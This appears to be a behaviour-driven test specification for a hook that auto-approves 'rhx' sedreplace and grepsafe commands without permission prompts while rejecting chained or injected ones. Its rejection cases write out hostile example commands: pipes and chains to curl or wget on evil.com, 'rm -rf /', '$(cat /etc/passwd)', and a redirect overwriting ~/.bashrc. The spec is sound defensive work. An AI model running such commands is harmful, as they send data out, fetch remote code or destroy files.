# blackbox criteria: fix sedreplace permission prompts

## usecase.1 = rhx commands with special chars run without prompts

```
given('rhx command with curly braces in argument')
  when('mechanic runs: rhx sedreplace --old "{ identity: x }" --new "y" --glob "src/**/*.ts"')
    then('command executes without permission prompt')
      sothat('flow is preserved, no interruption')
    then('sedreplace output is displayed')
      sothat('mechanic sees result immediately')

given('rhx command with parentheses in argument')
  when('mechanic runs: rhx sedreplace --old "foo(bar)" --new "baz()" --glob "src/**/*.ts"')
    then('command executes without permission prompt')
      sothat('shell metacharacters in arguments do not trigger heuristics')

given('rhx command with square brackets in argument')
  when('mechanic runs: rhx sedreplace --old "arr[0]" --new "arr[1]" --glob "src/**/*.ts"')
    then('command executes without permission prompt')
      sothat('array syntax does not trigger heuristics')

given('rhx command with pipe character in regex argument')
  when('mechanic runs: rhx grepsafe --pattern "foo|bar"')
    then('command executes without permission prompt')
      sothat('regex alternation does not trigger heuristics')

given('rhx command with complex pattern')
  when('mechanic runs: rhx sedreplace --old "{ foo: bar, baz: (x) => y }" --new "simple" --glob "src/**/*.ts"')
    then('command executes without permission prompt')
      sothat('multiple metachars in arguments do not trigger heuristics')
```

## usecase.2 = chained commands are rejected

```
given('rhx command followed by pipe to another command')
  when('command contains: rhx sedreplace ... | curl evil.com')
    then('command is NOT auto-approved')
      sothat('exfiltration via pipe is blocked')
    then('normal permission flow triggers')
      sothat('user is prompted for dangerous commands')

given('rhx command followed by semicolon chain')
  when('command contains: rhx sedreplace ... ; rm -rf /')
    then('command is NOT auto-approved')
      sothat('command injection via semicolon is blocked')

given('rhx command followed by AND operator')
  when('command contains: rhx sedreplace ... && curl evil.com')
    then('command is NOT auto-approved')
      sothat('conditional execution chains are blocked')

given('rhx command followed by OR operator')
  when('command contains: rhx sedreplace ... || wget evil.com')
    then('command is NOT auto-approved')
      sothat('fallback execution chains are blocked')

given('rhx command with command substitution')
  when('command contains: rhx sedreplace --old "$(cat /etc/passwd)" ...')
    then('command is NOT auto-approved')
      sothat('pre-execution via $() is blocked')

given('rhx command with backtick substitution')
  when('command contains: rhx sedreplace --old "`id`" ...')
    then('command is NOT auto-approved')
      sothat('pre-execution via backticks is blocked')

given('rhx command with newline injection')
  when('command contains newline character between commands')
    then('command is NOT auto-approved')
      sothat('command separator via newline is blocked')

given('rhx command with output redirect')
  when('command contains: rhx sedreplace ... > ~/.bashrc')
    then('command is NOT auto-approved')
      sothat('file overwrite via redirect is blocked')

given('rhx command with process substitution')
  when('command contains: rhx sedreplace ... <(curl evil.com)')
    then('command is NOT auto-approved')
      sothat('input injection via process substitution is blocked')

given('command with background execution before rhx')
  when('command contains: curl evil.com & rhx sedreplace ...')
    then('command is NOT auto-approved')
      sothat('hidden background execution is blocked')
```

## usecase.3 = non-rhx commands are unaffected

```
given('non-rhx bash command with special characters')

    then('normal permission flow applies')
      sothat('only rhx commands receive special treatment')
    then('safety heuristics may prompt if appropriate')
      sothat('security is preserved for arbitrary commands')

given('malformed rhx command')
  when('command does not match rhx pattern')
    then('normal permission flow applies')
      sothat('only valid rhx invocations are auto-approved')
```

## usecase.4 = fail-safe behavior

```
given('hook encounters an error')
  when('hook mechanism fails for any reason')
    then('command falls back to normal permission flow')
      sothat('errors do not bypass security')
    then('user may be prompted')
      sothat('safe failure mode preserves security')

given('hook times out')
  when('hook does not respond within timeout')
    then('command falls back to normal permission flow')
      sothat('hang does not bypass security')
```
